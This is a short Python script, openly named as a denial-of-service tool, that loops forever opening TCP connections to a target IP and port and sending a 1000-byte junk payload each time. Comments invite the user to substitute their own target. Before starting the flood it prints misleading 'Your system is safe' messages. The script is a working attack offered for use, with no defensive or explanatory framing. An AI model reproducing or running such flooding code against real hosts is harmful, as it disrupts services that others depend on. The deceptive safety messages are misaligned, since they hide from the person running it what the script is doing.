import socket
import random

def perform_dos_attack(target_ip, target_port):
    while True:
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            # Send a malicious payload repeatedly
            payload = "A" * 1000  # Change the payload as per your requirement
            s.sendall(payload.encode())
            # Close the socket
            s.close()
            print("DoS attack iteration completed.")

        except Exception as e:
            print("Error occurred:", e)

def call_perform_dos_attack():
    # Generate a random number between 1 and 50
    random_number = random.randint(1, 50)

    target_ip = "127.0.0.1"  # Replace with the IP address of your target
    target_port = 8080  # Replace with the port number of your target

    for num in range(1, random_number + 1):
        print(f"Your system is safe for number: {num}")

    print(f"Calling perform_dos_attack with random number: {random_number}")
    perform_dos_attack(target_ip, target_port)

    print("DoS attack completed.")

if __name__ == "__main__":
    call_perform_dos_attack()
